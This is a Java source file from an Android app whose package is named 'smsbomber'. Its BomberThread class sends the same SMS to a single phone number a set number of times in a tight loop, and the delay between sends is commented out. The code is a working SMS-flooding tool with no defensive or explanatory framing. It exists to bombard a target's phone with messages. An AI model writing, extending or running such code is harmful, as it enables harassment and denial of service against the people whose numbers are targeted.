package com.balkaya.kaan.smsbomber;

import android.telephony.SmsManager;

/**
 * Created by kaan on 20.05.2017.
 */

public class BomberThread implements Runnable {
    SmsManager mSms;
    String no,sms;
    int count;
    long time;
    BomberThread(String no, String sms, int count){
        mSms=SmsManager.getDefault();
        this.no=no;
        this.sms=sms;
        this.count=count;
        this.time=100;
    }
    @Override
    public void run() {
        for(int i=0; i<count; ++i) {
            mSms.sendTextMessage(no, null, sms, null, null);
           /* try {
                wait(time);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }*/

        }
    }
}
